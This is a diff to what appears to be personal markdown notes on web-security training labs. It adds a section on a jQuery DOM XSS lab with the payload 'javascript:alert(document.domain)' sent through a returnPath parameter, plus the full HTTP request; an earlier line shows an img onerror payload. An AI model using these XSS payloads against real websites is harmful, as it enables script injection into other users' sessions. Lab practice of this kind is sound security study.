@@ -104,5 +104,23 @@ so I used this `<img src=1 onerror=alert(1)>`
 ---
 
 ## Lab jQuery
+
 This was also easy as the payload was already provided in the notes section i.e. `javascript:alert(document.domain)`
-then all I did was a GET to make it run j
+then all I did was a GET to make it run javascript
+```
+GET /feedback?returnPath=javascript:alert(document.domain) HTTP/2
+Host: 0a49009c03655b1c805f035e009f0061.web-security-academy.net
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Google Chrome";v="143", "Not=A?Brand";v="8", "Chromium";v="143"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+
+```
